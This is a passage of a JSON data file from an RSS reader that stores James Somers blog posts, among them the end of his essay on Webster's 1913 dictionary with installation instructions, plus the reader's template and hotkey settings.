savoring. Listen to that phrase: &#8220;to flash conviction on the mind.&#8221; This is in a <em>dictionary</em>, for God&#8217;s sake.</p>\n\n<p>And, toward the bottom of the entry, as McPhee promised, is a usage note, explaining the fine differences in meaning between words in the penumbra of &#8220;flash&#8221;:</p>\n\n<blockquote>\n  <p>&#8230; Flashing differs from exploding or disploding in not being accompanied with a loud report. To glisten, or glister, is to shine with a soft and fitful luster, as eyes suffused with tears, or flowers wet with dew.</p>\n</blockquote>\n\n<p>Did you see that last clause? &#8220;To shine with a soft and fitful luster, as eyes suffused with tears, or flowers wet with dew.&#8221; I&#8217;m not sure why you won&#8217;t find writing like that in dictionaries these days, but you won&#8217;t. Here is the modern equivalent of that sentence in the latest edition of the Merriam-Webster: &#8220;glisten applies to the soft sparkle from a wet or oily surface &lt;glistening wet sidewalk&gt;.&#8221;</p>\n\n<p>Who decided that the American public couldn&#8217;t handle &#8220;a soft and fitful luster&#8221;? I can&#8217;t help but think something has been lost. &#8220;A soft sparkle from a wet or oily surface&#8221; doesn&#8217;t just sound worse, it actually describes the phenomenon with less precision. In particular it misses the shimmeriness, the micro movement and action, &#8220;the <em>fitful</em> luster,&#8221; of, for example, an eye full of tears &#8212; which is by the way far more intense and interesting an image than &#8220;a wet sidewalk.&#8221;</p>\n\n<p>It&#8217;s as if someone decided that dictionaries these days had to sound like they were written by a Xerox machine, not a person, certainly not a person with a poet&#8217;s ear, a man capable of high and mighty English, who set out to write the secular American equivalent of the King James Bible and pulled it off.</p>\n\n<h3>Words worth using</h3>\n\n<p>I don&#8217;t want you to conclude that it&#8217;s just a matter of aesthetics. Yes, Webster&#8217;s definitions are prettier. But they are also better. In fact they&#8217;re so much better that to use another dictionary is to keep yourself forever at arm&#8217;s length from the actual language.</p>\n\n<p>Recall that the New Oxford, for the word &#8220;fustian,&#8221; gives &#8220;pompous or pretentious speech or writing.&#8221; I said earlier that that wasn&#8217;t even really correct. Here, then, is Webster&#8217;s definition: &#8220;An inflated style of writing; a kind of writing in which high-sounding words are used, above the dignity of the thoughts or subject; bombast.&#8221; Do you see the difference? What makes fustian fustian is not just that the language is pompous &#8212; it&#8217;s that this pomposity is <em>above the dignity of the thoughts or subject</em>. It&#8217;s using fancy language where fancy language isn&#8217;t called for.</p>\n\n<p>It&#8217;s a subtle difference, but that&#8217;s the whole point: English is an awfully subtle instrument. A dictionary that ignores these little shades is dangerous; in fact in those cases it&#8217;s worse than useless. It&#8217;s misleading, deflating. It divests those words of their worth and purpose.</p>\n\n<p>Take &#8220;pathos.&#8221; This is one of those words I used to keep looking up because I kept forgetting what it meant &#8212; and every time I&#8217;d go to the dictionary I would get this terse, limiting definition: &#8220;a quality that evokes pity or sadness.&#8221; Not much there to grab a hold of. I&#8217;d wonder, Is that really all there is to pathos? It had always seemed a grander word than that. But this was the dictionary, and whatever it declared was final.</p>\n\n<p>Final, that is, until I discovered Webster:</p>\n\n<p><strong>pathos</strong> /ˈpāˌTHäs/, n. <em>1. The quality or character of those emotions, traits, or experiences which are personal, and therefore restricted and evanescent; transitory and idiosyncratic dispositions or feelings as distinguished from those which are universal and deep-seated in character; &#8212; opposed to <strong>ethos</strong>.</em></p>\n\n<p>It continued. <em>2. That quality or property of anything which touches the feelings or excites emotions and passions, esp., that which awakens tender emotions, such as pity, sorrow, and the like; contagious warmth of feeling, action, or expression; pathetic quality; as, the pathos of a picture, of a poem, or of a cry.</em></p>\n\n<p>Dear god! How did I not know about this dictionary? How could you even <em>call</em> yourself a dictionary if all you give for &#8220;pathos&#8221; is &#8220;a quality that evokes pity or sadness&#8221;? Webster&#8217;s definition is so much fuller, so much closer to felt experience.</p>\n\n<p>Notice, too, how much less certain the Webster definition seems about itself, even though it&#8217;s more complete &#8212; as if to remind you that the word came first, that the word isn&#8217;t <em>defined</em> by its definition here, in this humble dictionary, that definitions grasp, tentatively, at words, but that what words really are is this haze and halo of associations and evocations, a little networked cloud of uses and contexts.</p>\n\n<p>What I mean is that with its blunt authority the New Oxford definition of &#8220;pathos&#8221; &#8212; &#8220;a quality that evokes pity or sadness&#8221; &#8212; shuts down the conversation, it shuts down your thinking about the word, while the Webster&#8217;s version gets your wheels turning: it seems so much more provisional &#8212; &#8220;that which awakens tender emotions, such as pity, sorrow, and the like; contagious warmth of feeling, action, or expression; pathetic quality; as, the pathos of a picture, of a poem, or of a cry&#8221; &#8212; and therefore alive.</p>\n\n<p>Most important, it describes a word worth using: a mere six letters that have come to stand for something huge, for a complex meta-emotion with mythic roots. Such is the power of actual English.</p>\n\n<h3>The pleasure of finding things out</h3>\n\n<p>I could go on forever listing examples. I could say, &#8220;Look up <em>example</em>, <em>magic</em>, <em>sport</em>. Look up <em>arduous</em>, <em>huge</em>, <em>chauvinistic</em>, <em>venal</em>, <em>pell-mell</em>, <em>raiment</em>, <em>sue</em>, <em>smarting</em>, <em>stereotype</em>. Look up the word <em>word</em>, and <em>look</em>, and <em>up</em>. Look up every word you used today.&#8221; Indeed that&#8217;s what motivated this post: I&#8217;d been using Webster&#8217;s dictionary for about a year; I kept looking words up, first there, then in whatever modern dictionary was closest to hand, and seeing this awful difference, evidence of a crime that kept piling up in my mind, the guilt building: so many people were getting this wrong impression about words, every day, so many times a day.</p>\n\n<p>There&#8217;s an amazing thing that happens when you start using the right dictionary. Knowing that it&#8217;s there for you, you start looking up more words, including words you already know. And you develop an affection for even those, the plainest most everyday words, because you see them treated with the same respect awarded to the rare ones, the high-sounding ones.</p>\n\n<p>Which is to say you get a feeling about English that Calvin once got with his pet tiger on a day of fresh-fallen snow: &#8220;It&#8217;s a magical world, Hobbes. Let&#8217;s go exploring!&#8221;</p>\n\n<h3>Appendix: How to start using Webster&#8217;s 1913 dictionary on your Mac, iPhone, Android, and Kindle</h3>\n\n<p>The closest thing you can get to a plain-text, easily hackable, free, out-of-copyright version of the dictionary McPhee probably used is <a href=\"https://web.archive.org/web/20160108161120/http://machaut.uchicago.edu:80/websters\">Webster&#8217;s Revised Unabridged Dictionary (1913 + 1828)</a>.</p>\n\n<p>You&#8217;ll never use it, though, unless it&#8217;s built in to your computer and available easily on your phone and e-reader. For instance I wanted it so that whenever I typed a word into Spotlight, I&#8217;d get a Webster&#8217;s definition:</p>\n\n<p><a href=\"http://jsomers.net/blog/wp-content/uploads/2014/05/first.png\"><img decoding=\"async\" loading=\"lazy\" src=\"http://jsomers.net/blog/wp-content/uploads/2014/05/first.png\" alt=\"spotlight\" width=\"432\" height=\"114\" class=\"alignnone size-full wp-image-1147\" srcset=\"http://jsomers.net/blog/wp-content/uploads/2014/05/first.png 432w, http://jsomers.net/blog/wp-content/uploads/2014/05/first-300x79.png 300w\" sizes=\"(max-width: 432px) 100vw, 432px\" /></a></p>\n\n<p>I even wanted it so that when I highlighted a word in my browser, and hit Cmd + Ctrl + D, I&#8217;d see a definition from Webster&#8217;s:</p>\n\n<p><a href=\"http://jsomers.net/blog/wp-content/uploads/2014/05/second.png\"><img decoding=\"async\" loading=\"lazy\" src=\"http://jsomers.net/blog/wp-content/uploads/2014/05/second.png\" alt=\"inline\" width=\"349\" height=\"514\" class=\"alignnone size-full wp-image-1146\" srcset=\"http://jsomers.net/blog/wp-content/uploads/2014/05/second.png 349w, http://jsomers.net/blog/wp-content/uploads/2014/05/second-203x300.png 203w\" sizes=\"(max-width: 349px) 100vw, 349px\" /></a></p>\n\n<p>Here&#8217;s how I got that to work:</p>\n\n<ul>\n<li>Download <a href=\"https://s3.amazonaws.com/jsomers/dictionary.zip\">this archive from S3</a>.</li>\n<li>Unzip it and launch the DictUnifier app.</li>\n<li>Drag the <code>stardict-dictd-web1913-2.4.2.tar.bz2</code> file, still compressed, onto that app&#8217;s little drag-and-drop area. It might take a few seconds before the conversion process starts. Once it does, it&#8217;ll take about 30 minutes to finish.</li>\n<li>The dictionary will now be available in your Dictionary app. (If not, you may need to enable it in the app&#8217;s Preferences pane, as <a href=\"https://cloud.githubusercontent.com/assets/21294/3085216/6b3463ae-e50b-11e3-822d-a59765748865.png\">here</a>.) But its formatting may look a little off. If the lines are squished together, open  <code>~/Library/Dictionaries/dictd_www.dict.org_web1913.dictionary/Contents/DefaultStyle.css</code> in a text editor and add the following directive:</li>\n</ul>\n\n<div class=\"highlight highlight-css\"><pre><span class=\"nt\">p</span> <span class=\"p\">{</span> <span class=\"k\">line-height</span><span class=\"o\">:</span> <span class=\"m\">0.7em</span> <span class=\"p\">}</span>\n</pre></div>\n\n<p>Restart the Dictionary app to confirm that the CSS was updated correctly. (You might also try bumping the <code>margin-top</code> and <code>margin-bottom</code> values in the <code>div.y</code> block to 0.7em, from 0.5em. And some folks have said that 1em works better than 0.7em.)</p>\n\n<ul>\n<li>If you&#8217;re on a new M1 Mac with the Monterey OS, follow these instructions:\n\n<ol>\n<li>This GitHub Link has a &#8220;Just want the Dictionary?&#8221; section that links to the .dictionary folder on the releases page in GitHub: https://github.com/ponychicken/WebsterParser</li>\n<li>Dictionary &#8211;> File &#8211;> Open Dictionaries Folder, and then, in Finder, dragging the downloaded &#8220;Websters-1913.dictionary&#8221; file into the folder, and then Dictionary &#8211;> Dictionary &#8211;> Preferences, checking the now last dictionary in the list, and dragging it to the top, gets the job done.</li>\n</ol></li>\n<li>If you want to always see Webster&#8217;s results by default, go to the Dictionary app&#8217;s preferences and drag Webster&#8217;s to the top of the list.</li>\n<li>If you&#8217;re on OS X Lion, follow <a href=\"http://apple.stackexchange.com/questions/22897/how-to-place-dictionary-definitions-higher-up-in-spotlight-results\">these instructions</a> so that Dictionary results appear first in Spotlight searches.</li>\n<li>If you&#8217;re unhappy with the formatting of the entries in Dictionary, <a href=\"https://github.com/aparks517/convert-websters\">here</a> are alternative instructions for setting up Webster&#8217;s on OS X that may give better results. (<a href=\"https://github.com/DieBuche/WebsterParser\">Here</a>, too.)</li>\n<li>To get it on your iPhone, get the Stardict-compatible <a href=\"https://itunes.apple.com/us/app/dictionary-universal/id312088272?mt=8\">Dictionary</a> app. On its installation screen, go to the &#8220;Network&#8221; tab and type <code>https://emw3.com/stardict-dictd-web1913-2.4.2.tar.bz2</code>, exactly, into the URL bar. (Alternatively, just download <a href=\"http://itunes.apple.com/app/id943993346\">this free app</a> by Aaron Parks.)</li>\n<li>For Android, you can follow <a href=\"https://gist.github.com/jsomers/9dd78c8dc7fab071993c\">these instructions</a>, courtesy of <a href=\"https://twitter.com/TheRealPlato\">@TheRealPlato</a>.</li>\n<li>To add the dictionary as a search engine on Chrome, follow <a href=\"https://gist.github.com/jsomers/60159ee970d6dee86aa2\">these instructions</a>, courtesy of <a href=\"https://twitter.com/chancelionheart\">@chancelionheart</a>.</li>\n<li>And finally, <a href=\"https://gist.github.com/jsomers/4236a2770a51e0b24900\">follow these instructions</a> to get the dictionary on your Kindle.</li>\n</ul>\n\n<h3>Notes</h3>\n\n<p>[1] Note that the modern Merriam-Webster, even though it does derive directly from Webster&#8217;s original, has been revised so much that it&#8217;s actually <em>less</em> similar, content-wise, than some of the impostors. It, too, is one of the &#8220;wrong&#8221; dictionaries.</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/dictionary",
          "creator": "James Somers",
          "pubDate": "Sun, 18 May 2014 19:09:04 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "d8a0e7fe145245254c156a642926ee16",
          "highlights": []
        },
        {
          "title": "More people should write",
          "description": "More people should do what I&#8217;m doing right now. They should sit at their computers and bat the cursor around &#8212; write full sentences about themselves and the things they care about. I have a selfish reason for my demand: I have a lot of friends who are thoughtful, but keep their thoughts to themselves. [&#8230;]",
          "content": "<p>More people should do what I&#8217;m doing right now. They should sit at their computers and bat the cursor around &#8212; write full sentences about themselves and the things they care about.</p>\n\n<p>I have a selfish reason for my demand: I have a lot of friends who are thoughtful, but keep their thoughts to themselves. I imagine finding notebooks under their bed, tens of composition books packed with little print. I think about what sort of a treasure that would be.</p>\n\n<p>But that&#8217;s not why you should write.</p>\n\n<p>You should write because when you know that you&#8217;re <em>going</em> to write, it changes the way you live. I&#8217;m thinking about a book I read called <em><a href=\"http://www.amazon.com/Field-Science-Nature-Michael-Canfield/dp/0674057570\">Field Notes on Science &amp; Nature</a></em>, a collection of essays by scientists about their notes. It&#8217;s hard to imagine a more tedious concept &#8212; a book of essays about <em>notes</em>? &#8212; but in execution it was wonderful. What it teaches you, over and over again, is that the difference between you and a zoologist or you and a botanist is that the botanist, when she looks at a flower, has a question in mind. She&#8217;s trying to <em>generate</em> questions. For her the flower is the locus of many mental threads, some nascent, some spanning her career. Her field notebook is not some convenient way to store lifeless data to be presented in lifeless papers so that other scientists can replicate some dull experiment; it&#8217;s the site of a collision between a mind and a world.</p>\n\n<p><a href=\"http://jsomers.net/blog/wp-content/uploads/2012/09/photo.jpg\"></p>\n\n<div style=\"text-align: center; margin:0 auto; margin-bottom: 20px\">\n    <img decoding=\"async\" src=\"http://jsomers.net/blog/wp-content/uploads/2012/09/photo.jpg\" width=\"480px;\"/>\n</div>\n\n<p></a></p>\n\n<p>That&#8217;s the promise: you will live more curiously if you write. You will become a scientist, if not of the natural world than of whatever world you care about. More of that world will pop alive. You will <em>see</em> more when you look at it.</p>\n\n<p>It&#8217;s like what happens to a room during a game of &#8220;I Spy&#8221;: if your friend spies something red, the red stuff glows.</p>\n\n<p>When I have a piece of writing in mind, what I have, in fact, is a mental bucket: an attractor for and generator of thought. It&#8217;s like a thematic gravity well, a magnet for what would otherwise be a mess of iron filings. I&#8217;ll read books differently and listen differently in conversations. In particular I&#8217;ll remember everything better; everything will mean more to me. That&#8217;s because everything I perceive will unconsciously engage on its way in with the substance of my preoccupation. A preoccupation, in that sense, is a hell of a useful thing for a mind.</p>\n\n<p>Writing needn&#8217;t be a formal enterprise to have this effect. You don&#8217;t have to write <em>well</em>. You don&#8217;t even have to &#8220;write,&#8221; exactly &#8212; you can just talk onto the page.</p>\n\n<p>I suggest writing emails to your friends. Writing with an audience in mind makes the writing better, and writing to a friend means you won&#8217;t get hung up on how you sound. You&#8217;ll become closer, too, to whoever you share your thoughts with, and odds are you&#8217;ll draw the same thoughtfulness out of them. Your inbox will become less of a place for coupons and bullshit than for the thoughts of humans you like.</p>\n\n<p>Walk around with a pen and a scrap of paper. Write some meaty emails. Engage more intensely with this place.</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/more-people-should-write",
          "creator": "James Somers",
          "pubDate": "Thu, 27 Sep 2012 05:57:12 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": true,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9ef9ccb8eb649ff4606f20a501629a14",
          "highlights": []
        },
        {
          "title": "The best general advice on earth",
          "description": "These are excerpts (emphasis mine) from William James&#8217;s 1890 classic, Principles of Psychology, Chapter IV, &#8220;Habit&#8221;: The great thing, then, in all education, is to make our nervous system our ally instead of our enemy. It is to fund and capitalize our acquisitions, and live at ease upon the interest of the fund. For this [&#8230;]",
          "content": "<p>These are excerpts (emphasis mine) from William James&#8217;s 1890 classic, <em>Principles of Psychology</em>, Chapter IV, &#8220;Habit&#8221;:</p>\n\n<ol>\n<li>The great thing, then, in all education, is to make our nervous system our ally instead of our enemy. It is to fund and capitalize our acquisitions, and live at ease upon the interest of the fund.</li>\n\n<li>For this we must make automatic and habitual, as early as possible, as many useful actions as we can, and guard against the growing into ways that are likely to be disadvantageous to us, as we should guard against the plague. The more of the details of our daily life we can hand over to the effortless custody of automatism, the more our higher powers of mind will be set free for their own proper work.</li>\n\n<li><strong>Seize the very first possible opportunity to act on every resolution you make, and on every emotional prompting you may experience in the direction of the habits you aspire to gain. It is not in the moment of their forming, but in the moment of their producing motor effects, that resolves and aspirations communicate the new &#8216;set&#8217; to the brain.</strong></li>\n\n<li>No matter how full a reservoir of maxims one may possess, and no matter how good one&#8217;s sentiments may be, if one have not taken advantage of every concrete opportunity to act, one&#8217;s character may remain entirely unaffected for the better.</li>\n\n<li>As a final practical maxim, relative to these habits of the will, we may, then, offer something like this: Keep the faculty of effort alive in you by a little gratuitous exercise every day. <strong>That is, be systematically ascetic or heroic in little unnecessary points, do every day or two something for no other reason than that you would rather not do it</strong>, so that when the hour of dire need draws nigh, it may find you not unnerved.</li>\n</ol>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/william-james-advice",
          "creator": "James Somers",
          "pubDate": "Thu, 26 Jul 2012 03:09:33 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "e3694c4474e9e5d4446c9e46318e574f",
          "highlights": []
        }
      ],
      "folder": "log",
      "name": "jsomers",
      "language": "en",
      "hash": "d9f46271ec43abc2f6582eee1502f7ff"
    }
  ],
  "dateFormat": "YYYY-MM-DDTHH:mm:SS",
  "template": "---\nlink: {{link}}\nauthor: {{author}}\npublished: {{published}}\ntags: [{{tags:,}}]\n---\n# Highlights\n{{highlights}}\n\n---\n# {{title}}\n{{content}}",
  "pasteTemplate": "## {{title}}\n{{content}}",
  "askForFilename": true,
  "defaultFilename": "{{title}}",
  "autoSync": false,
  "hotkeys": {
    "create": "n",
    "paste": "v",
    "copy": "c",
    "favorite": "f",
    "read": "r",
    "tags": "t",
    "open": "o",
    "tts": "s",
    "previous": "ArrowLeft",
    "next": "ArrowRight"
  },
  "folded": [
    "rip",
    "jsomers",
    "zhangluyao",
    "log",
    "zhangdinghao"
  ],
  "renamedText": {
    "filtered_folders": "",
    "folders": "",
    "no_folder": ""
  },
  "displayMedia": true
}